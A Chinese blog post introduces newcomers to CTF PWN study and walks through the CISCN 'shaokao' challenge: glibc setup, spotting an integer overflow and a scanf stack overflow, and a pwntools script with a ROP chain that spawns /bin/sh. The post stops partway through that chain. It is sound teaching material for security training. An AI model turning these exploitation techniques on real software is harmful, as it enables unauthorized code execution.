<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>我们对 PWN 都有哪些误会 | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>我们对 PWN 都有哪些误会</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-09-21T09:41:16.000Z" id="date"> 2023-09-21</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-12-29T04:50:35.021Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><blockquote>
<p>应安恒的邀请，笔者撰写了本文。希望它能帮到那些想要入门 PWN ，却又不知如何是好的新人。</p>
</blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚入学的时候问了一些大哥们 CTF 中都有哪些方向，分别是做什么的，以及难易度如何，对于难易度方面，大哥们基本上都会回答 “PWN” 是入门最困难的方向。这对于当时一无所知的我造成了巨大的心理压力，但由于队内基本上没有其他师傅做这个方向，所以最开始是半推半就的选择了它。</p>
<p>但是它其实并没有人们说的那么困难，只是因为人们对他的印象与其他方向相比，更具有一层朦胧感。比如 Crypto，一言蔽之其实是数学；再比如 Web，入门其实是各种工具的使用；但到了二进制方向，我们发现，其实不太好找到一个简单易懂的描述去向新人说明它的入门门槛是什么，无论怎么说，似乎都有一些薄薄的朦胧感。</p>
<p>就比如我向你介绍 Pwn 的时候说它是 “二进制漏洞挖掘与利用”，并跟你说 “先把 C 语言、汇编、CSAPP 看完”，假设你是一个刚入学的大一新生，并且从来没有接触过这方面的相关内容， 那你大概率只能听懂 “先把 C 语言看完” 这一点，相比于 “先把某某某工具的使用熟悉一下” ，然后大哥紧跟着丢了几篇简单易懂的操作教程，自然还是 Pwn 比较令人迷糊。</p>
<p>但事实上，如果你是计算机相关专业的学生，那 Pwn 的前置技能其实很可能是你大学三年的必修课，只是你需要提前把它们掌握罢了。哪怕你的培养方案里没有这部分内容，甚至哪怕你不准备做 Pwn 方向，掌握一部分基础技能也会让你对计算机的理解更加深刻（甚至你会发现，渐渐的，你的理解已经让同学无法理解了）。</p>
<p>所以 Pwn 其实并没有人们常说的那样难以入门，因为很多内容都是你的必修课而非专业课，只是你需要靠自学的方式提前把它们掌握罢了。</p>
<p>不过我对 Pwn 的态度正如我过去在知乎的某个回答：</p>
<blockquote>
<p>个人感觉最大的难点在于“能否耐得住寂寞”，因为很难说一个人会对这个东西长期持续地抱有很高的热情，大概是有那样的人，并且那样的人都成大神了，但我这种普通人说实话不太做得到……兴趣肯定还是有的，但很难说还会比当年刚入坑时候要高了。</p>
<p>个人认为现在学pwn已经没有什么系不系统的问题了，随便一搜资料，跟着大师傅们做做，入了这个门槛，然后从此以后基本上自己就能知道要做什么了。但难点在于，现在是2022年，前人搞过的东西已经被修缮的非常好了，但你还是要从前人的路开始走，因此很可能会有一段很长的时间是“什么都做不了”的状态，比赛也是爆零，挖洞也什么都不知道，像是浑浑噩噩就这么晃悠过去一两年之类的，然后就渐渐没有了当年的兴致，觉得这条路太过艰难了（我自己就是这种菜鸡，有很长一段时间因为和现在的赛题考点脱节以至于比赛一题都做不出来…），然后再看看同级的师傅们去搞钱，一两天就赚的比自己实习一个月还高，眼一红心一横就转 web 去了，然后靠着二进制基础比别人多拿一点……</p>
</blockquote>
<p>我必须在刚入门时抱以极高的热情，才能在漫长的自学过程中坚持下来，否则这很容易就让人怀疑自己是否需要如此急迫的完成如此之多的任务，但实际上，这却又是没办法的事情。</p>
<h1 id="How-to-do"><a href="#How-to-do" class="headerlink" title="How to do"></a>How to do</h1><h2 id="Q1-到底什么时候才算入门"><a href="#Q1-到底什么时候才算入门" class="headerlink" title="Q1:到底什么时候才算入门"></a>Q1:到底什么时候才算入门</h2><p>不妨先枚举一下常被归为入门必修课的技能:</p>
<ul>
<li><strong>提问的智慧</strong></li>
<li><strong>搜索引擎的使用</strong></li>
<li>C 语言</li>
<li>汇编语言</li>
<li>IDA&#x2F;gdb 的使用</li>
<li>Python 脚本的编写</li>
<li>x86_64 架构下程序运行原理</li>
<li>ctf-wiki</li>
</ul>
<p>其中最容易被忽略，却又最重要的其实是第一和第二个。只有先学会如何提问和如何自行解决问题以后才有其他后话可说。当然，大部分人都会在之后的学习里不知不觉地掌握它们，但首先得有这份意识。</p>
<p>然后是二进制精专的入门课程，想来很多人在初学时都会跟我一样抱有这样的疑问：“我知道要学这个，但是要学到什么程度才行？”</p>
<p>其实这并不需要自己去烦恼，因为我们最后都要进入实战。当你困惑于是否还需要继续向下深入时，不妨上更大平台找一道入门题目，在不看任何答案的情况下检验自己。如果你能够做出来，哪怕只是勉强做出来，那都说明你已经迈过了这个门槛。而如果你尚且还做不出来，那么就需要了解自己是因为哪方面的原因导致，然后在这个方面进一步深入。</p>
<p>比方说 C 语言，但你看完了基础语法，能够上手写点简单的代码时，就可以开始尝试了；再比方说汇编，如果你能一行一行读明白它们在做什么，那大多时候也足够入门了。</p>
<p>用具体的数值量化的话，如果你看的是书籍，那么一般要看到书的 1&#x2F;2 部分，剩下的 1&#x2F;2 或许暂时用不上，但日后总会遇到需要补课的时候。</p>
<p>总的来说，只要能够独立完成一道基本的 ret2text ，其实就已经算是入门了。</p>
<h2 id="Q2-我学完了基础，为什么感觉看题时还是很迷茫"><a href="#Q2-我学完了基础，为什么感觉看题时还是很迷茫" class="headerlink" title="Q2:我学完了基础，为什么感觉看题时还是很迷茫"></a>Q2:我学完了基础，为什么感觉看题时还是很迷茫</h2><p>一般来说也分两种情况，一种是遇到了自己从没见识过的东西，另外一种则是基础不够扎实。这里推荐各位参考 <strong>CTF-Wiki</strong> 下 <strong>Pwn - Linux Platform - User Mode - Exploitation - Stack Overflow - x86</strong> 部分，跟着其内容完成 <strong>栈介绍-栈溢出原理 - 基本 ROP</strong> 这三个部分。在你完成这三个部分以后，基本上对于常规的栈溢出入门题来说，哪怕不会做，也不至于看不懂题目想让你做什么了。</p>
<p>对于一些因为没接触过的提醒导致的迷茫，最好的办法就是搜索。刚入门的时候大家都只接触过栈溢出的利用，但是一旦突然撞上了堆题，那一头雾水也是再正常不过的事情了。这种情况下最好的办法就是现学现用，活用自己的搜索能力去寻找于题型类似的题目，如果找不到，再开始从头学起。</p>
<p>这里介绍一些常规的做题流程，具体细节可能因人而异：</p>
<h3 id="确认题目的运行环境-运行的平台-动态库版本等"><a href="#确认题目的运行环境-运行的平台-动态库版本等" class="headerlink" title="- 确认题目的运行环境 - 运行的平台&#x2F;动态库版本等"></a>- 确认题目的运行环境 - 运行的平台&#x2F;动态库版本等</h3><p>目前的大环境来说，对于需要使用 libc 的题目一般都会将使用的 libc 或者容器的 dockerfile 作为附件一起打包给选手。对于前者的情况下，当我们直接使用 IDA 打开该文件即可知道对应的版本：</p>
<p class='item-img' data-src='/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/glibc.png'><img src="/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/glibc.png"></p>
<p>如果题目需要选手直接对堆进行调试的话，那么就需要使用 Glibc-All-in-one 和 patchelf 根据版本去修改链接的动态库。</p>
<p>这里推荐一下团队里的师傅开发的工具：<a target="_blank" rel="noopener" href="https://github.com/ef4tless/xclibc.git%EF%BC%8C%E8%AF%A5%E5%B7%A5%E5%85%B7%E8%83%BD%E5%A4%9F%E4%B8%80%E9%94%AE%E5%AE%8C%E6%88%90%E4%B8%8A%E8%BF%B0%E7%9A%84%E6%9B%BF%E6%8D%A2%E5%8A%9F%E8%83%BD%E3%80%82%E7%94%B1%E4%BA%8E">https://github.com/ef4tless/xclibc.git，该工具能够一键完成上述的替换功能。由于</a> README 写的非常完善了，这里就不过多赘述。</p>
<p>而如果题目附件中提供了 dockerfile，那么使用的动态库版本一般都会和使用的容器一一对应。</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">16.04</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 xinetd</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m ctf</span><br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /home/ctf</span><br><span class="hljs-comment"># 以下省略</span><br></code></pre></td></tr></table></figure>

<p>对于大多数 dockerfile 都会在第一行标注出使用的容器环境，对应关系如下：</p>
<ul>
<li>ubuntu:16.04 &#x2F; glibc-2.23</li>
<li>ubuntu:18.04 &#x2F; glibc-2.28</li>
<li>ubuntu:20.04 &#x2F; glibc-2.31</li>
<li>ubuntu:22.04 &#x2F; glibc-2.34</li>
</ul>
<p>除此之外，最新版的 glibc 已经到了 glibc-2.38 了，但这之后的版本使用范围比较小，目前大部分都只会用到 2.34 版本为止。另外，如果选手遇到一些使用特殊版本的容器时，就需要本地构建 docker 容器后将动态库从容器中复制到本地。具体要根据题目给出的构建规则去创建容器，然后使用类似如下的命令拉取：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">docker <span class="hljs-built_in">cp</span> imageid:/lib32/libc.so.6 本地路径<br></code></pre></td></tr></table></figure>

<p>另外，对于一些跨架构的题目，比如 arm64 等，则需要使用 qemu 去模逆执行，具体情况要根据题目去选择。</p>
<h3 id="反编译二进制文件静态分析理解代码逻辑"><a href="#反编译二进制文件静态分析理解代码逻辑" class="headerlink" title="- 反编译二进制文件静态分析理解代码逻辑"></a>- 反编译二进制文件静态分析理解代码逻辑</h3><p>接下来我们用一道具体的题目来练练手。</p>
<p>这里笔者选用了今年举办的 CISCN 初赛中的 <code>shaokao</code> 作为演示，考虑到部分师傅可能对计算机原理还不甚熟悉，因此只选用了较为入门的一道题目。</p>
<p>因为文件不是很大，我们先用 IDA 直接打开它，看看能不能做些简单的分析：</p>
<p class='item-img' data-src='/shaokao1.png'><img src="/shaokao1.png"></p>
<blockquote>
<p>部分师傅用 IDA 打开以后可能直接反编译不会是这个结果，这种情况下请使用 IDA7.7 以上的版本，其中添加了对 switch 的反编译支持</p>
</blockquote>
<p>可以看出，题目是一个基本的菜单，根据用户输入的内容分别有几种不同的函数被执行，接下来我们一个一个跟进去确认一下</p>
<h4 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h4><p class='item-img' data-src='/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao2.png'><img src="/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao2.png"></p>
<p>代码还算清楚，可以看出第一个函数是用来购买啤酒的。用户先是选择想要的种类，然后给出数量，最后会将全局变量里的钱进行扣除</p>
<h4 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h4><p class='item-img' data-src='/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao3.png'><img src="/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao3.png"></p>
<p>分支2 和前一个函数基本相同，基本上只有价格不一样而已，所以这里我们快速阅读后可以跳过这个函数。</p>
<h4 id="case3"><a href="#case3" class="headerlink" title="case3"></a>case3</h4><p class='item-img' data-src='/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao4.png'><img src="/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao4.png"></p>
<p>这个函数用来显示当前还有多少钱，写的很规范，基本上一眼就能排处它的嫌疑</p>
<h4 id="case4"><a href="#case4" class="headerlink" title="case4"></a>case4</h4><p class='item-img' data-src='/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao5.png'><img src="/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao5.png"></p>
<p>分支4的逻辑也很清晰，如果我们现在非常有钱，那么就能直接把烧烤摊买下来，这里设置了 own 为 1，在 main 函数中我们可以看到，如果这个全局变量非 0 ，那么我们就能够进入分支 5</p>
<h4 id="case5"><a href="#case5" class="headerlink" title="case5"></a>case5</h4><p class='item-img' data-src='/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao6.png'><img src="/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao6.png"></p>
<p>此处可以见到另外一个输入函数，而 <code>scanf</code> 函数作为一个读取输入的函数，根据参数的不同是有可能导致危险的。通过 IDA，我们可以确认出它所使用的格式化字符串为 <code>%s</code> ，这意味着此处存在栈溢出漏洞。</p>
<h4 id="漏洞发现与利用"><a href="#漏洞发现与利用" class="headerlink" title="漏洞发现与利用"></a>漏洞发现与利用</h4><p>到这一步相信读者已经大概明白要怎么完成这道题了。题目的逻辑很简单，当用户的钱非常多的时候，就可以把烧烤摊买下来；而买下来以后就可以调用 <code>gaiming</code> 函数触发栈溢出写入 ROP 来劫持程序的运行了。</p>
<blockquote>
<p>如果您对 ROP 的工作原理感到困惑，可以阅读本文:<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/</a></p>
</blockquote>
<p>但是问题来了，这个 <code>money</code> 的默认值是 233，而且我们似乎不管做什么都只会减少不会增多，那要如何才能买下烧烤摊呢？</p>
<p>如果您已经知道了整数溢出漏洞的存在，那么想必您已经知道对于计算机来说，加一个数等于减去一个负数，只需要买 -10000 瓶酒就能搞定了。</p>
<p>但是假如我们作为一个刚刚入门的新人，才只接触过栈溢出的基本利用，此时正是一头雾水的时候，我们该怎么办呢？</p>
<p>那么此时肯定就要依靠我们自己的搜索和整理能力了。第一个方法很简单也很朴素，既然是我们从未了解过的漏洞类型，那么遍历一遍常见的漏洞列表，大概率能找到与之吻合的类型：</p>
<p class='item-img' data-src='/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao7.png'><img src="/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao7.png"></p>
<p>排处掉第一个栈溢出之后，第二个是格式化字符串。再确认了所有的 <code>printf</code> 和 <code>scanf</code> 的输入参数都不能由我们控制后，这个类型也可以排处。以及由于整个程序都没有使用到 <code>malloc</code> 和 <code>free</code>，肯定和堆也没关系，因此也排除第三种。</p>
<p>第四种看起来非常的复杂，对于新人来说基本上完全看不懂，因此暂且跳过。当我们选到第五种的时候，联系其逻辑中对全局变量的运算，就能相对自然的把利用方式对上。</p>
<h3 id="动态调试验证漏洞存在"><a href="#动态调试验证漏洞存在" class="headerlink" title="- 动态调试验证漏洞存在"></a>- 动态调试验证漏洞存在</h3><p>而既然我们现在模模糊糊的确认代码中存在整数溢出，那么接下来就是要通过调试来确定这个漏洞的存在了。</p>
<p>我们写一个简单的脚本去验证一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>p=process(<span class="hljs-string">&quot;./shaokao&quot;</span>)<br>gdb.attach(p,<span class="hljs-string">&quot;b*0x401FAE&quot;</span>)<br>pause()<br>p.recvuntil(<span class="hljs-string">&quot;0. &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;3. &quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;-999998&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>脚本的逻辑很简单，随便选一个啤酒，然后买上 -999998 瓶，然后来看看 gdb 里的反应如何。</p>
<p>我们在这个地方下了个断点，观察一下什么值会被放入全局变量:</p>
<p class='item-img' data-src='/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao8.png'><img src="/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao8.png"></p>
<p class='item-img' data-src='/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao9.png'><img src="/images/%E6%88%91%E4%BB%AC%E5%AF%B9PWN%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E8%AF%AF%E8%A7%A3/shaokao9.png"></p>
<p>通过调试可以发现，此时的 eax 真的会变成一个非常大的数字，从而我们验证了漏洞的存在，现在就可以开始编写 exp 了。</p>
<h3 id="编写脚本-调试进行利用"><a href="#编写脚本-调试进行利用" class="headerlink" title="- 编写脚本+调试进行利用"></a>- 编写脚本+调试进行利用</h3><p>由于题目是静态编译的，因此我们可以使用如下命令快速构造 ROP</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">ROPgadget --binary shaokao --ropchain<br></code></pre></td></tr></table></figure>

<p>最后构造的 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>p=process(<span class="hljs-string">&quot;./shaokao&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b*0x401FAE&quot;)</span><br><span class="hljs-comment">#pause()</span><br>p.recvuntil(<span class="hljs-string">&quot;0. &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.recvuntil(<span class="hljs-string">&quot;3. &quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;-999998&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;0. &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br><br>p.recvuntil(<span class="hljs-string">&quot;0. &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rop</span>():<br>	p = <span class="hljs-string">&#x27;&#x27;</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a67e</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e0</span>) <span class="hljs-comment"># @ .data</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000458827</span>) <span class="hljs-comment"># pop rax ; ret</span><br>	p += <span class="hljs-string">&#x27;/bin//sh&#x27;</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000045af95</span>) <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a67e</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000447339</span>) <span class="hljs-comment"># xor rax, rax ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000045af95</span>) <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040264f</span>) <span class="hljs-comment"># pop rdi ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e0</span>) <span class="hljs-comment"># @ .data</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a67e</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004a404b</span>) <span class="hljs-comment"># pop rdx ; pop rbx ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x4141414141414141</span>) <span class="hljs-comment"># padding</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000447339</span>) <span class="hljs-comment"># xor rax, rax ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000496710</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>	p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span 